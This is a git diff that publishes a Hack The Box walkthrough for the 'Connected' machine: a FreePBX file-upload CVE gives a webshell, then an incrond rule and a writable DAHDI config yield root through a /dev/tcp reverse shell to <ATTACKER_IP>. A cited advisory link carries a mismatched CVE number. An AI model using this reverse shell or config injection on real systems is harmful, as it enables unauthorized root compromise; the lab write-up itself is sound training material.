@@ -1,7 +1,7 @@
 ---
 title: "Connected"
-date: "2026-09-19"
-summary: "Walkthrough for Cohort on Hack The Box, release after machine retirement"
+date: "2026-11-24"
+summary: "A FreePBX arbitrary file upload lands a webshell as asterisk, then incrond and a writable DAHDI config hand over root."
 platform: "htb"
 machineName: "Connected"
 difficulty: "easy"
@@ -50,4 +50,125 @@ Nmap done: 1 IP address (1 host up) scanned in 25.39 seconds
 
 Three services on ports 22, 80 and 443. And the HTTP service tries to resolve to `connected.htb` . Adding it to the `hosts` and visiting the site:-
 
-*This box is still active on HackTheBox. Once retired, this writeup will be published for public access as per HackTheBox's policy on publishing content from their platform*
+![Fig1. FreePBX administrator panel](./img/Connected/image.png)
+
+Fig1. FreePBX administrator panel
+
+We’ve landed on the FreePBX administration panel. And in Fig1. if we notice the footer of the panel, we can see that it is showing the version of FreePBX:- `16.0.40.7`
+
+## CVE-2025-57819
+
+Googling the FreePBX version leads us to CVE-2025-57819, an authenticated arbitrary file upload vulnerability in the FreePBX endpoint manager module.
+
+According to [SentinelOne’s](https://www.sentinelone.com/vulnerability-database/cve-2025-61678/) page, through this vulnerability, “Authenticated attackers can upload arbitrary files, including webshells, to attacker-chosen paths, enabling remote code execution on the FreePBX host.”.
+
+Using https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE ‘s PoC for this CVE:-
+
+![Fig2. Initial access as user `asterisk`](./img/Connected/user.png)
+
+Fig2. Initial access as user `asterisk`
+
+We have achieved initial access as user `asterisk` after uploading a webshell and then catching a reverse shell back on our listener.
+
+# Privilege Escalation
+
+While enumerating the process trees of running in the context of the `root` user (using `ps auxf | grep "root"` ), I came on something interesting:-
+
+![Fig3: `incrond` running as `root`](./img/Connected/image%201.png)
+
+Fig3: `incrond` running as `root`
+
+The `incrond` service was running as `root`
+
+`incrond` is a Linux daemon that monitors for files and directories for changes and runs specified commands when those occur.
+
+Checking the files under `incron.d` directory:-
+
+```bash
+cat /etc/incron.d/*
+
+/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
+/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
+/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
+/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
+/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
+/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
+/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
+/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
+
+/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
+```
+
+This entry looks interesting:-
+
+`/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart` 
+
+The monitored directory was accessible by the `asterisk` user:
+
+```bash
+ls -ld /var/spool/asterisk/sysadmin
+
+drwxrwxr-x. 2 asterisk asterisk 4096 Nov 30  2025 /var/spool/asterisk/sysadmin
+```
+
+So, if write to `dahdi_restart`, then we could case the corresponding command to be executed by the root-owned `incrond` service.
+
+I checked the command triggered by the incron rule:
+
+```bash
+cat /usr/sbin/sysadmin_dahdi_restart
+#!/bin/sh
+
+/etc/init.d/asterisk stop
+
+sleep 5
+
+/etc/init.d/dahdi restart
+
+sleep 5
+
+export PATH=$PATH:/usr/local/sbin/:/usr/local/bin/
+`which amportal` start
+```
+
+It restarts the DAHDI service. I then checked the DAHDI startup script:-
+
+```bash
+ls -ld /etc/dahdi/init.conf
+
+-rw-r--r--. 1 asterisk asterisk 855 Sep 19 07:56 /etc/dahdi/init.conf
+```
+
+Since this file was writable by `asterisk`, it could be modified to execute commands when DAHDI was restarted.
+
+### DAHDI Abuse to `root`
+
+I added a simple revere shell payload to the end of `/etc/dahdi/init.conf` :
+
+```bash
+printf '\nsh -i >& /dev/tcp/<ATTACKER_IP>/7131 0>&1\n' >> /etc/dahdi/init.conf
+```
+
+Start a `netcat` listener to catch the callback from the reverse shell:-
+
+```bash
+nc -nvlp 7131
+```
+
+Let us now cause the incron event by modifying the monitored file:-
+
+```bash
+touch /var/spool/asterisk/sysadmin/dahdi_restart
+```
+
+Then we receive the reverse shell callback:-
+
+![Fig4: `root` reverse shell](./img/Connected/image%202.png)
+
+Fig4: `root` reverse shell
+
+`pwned`
+
+# Learnings
+
+- `icron` (Inotify Cron) is a specialized variant of cron that triggers tasks based on filesystem events rather than a clock
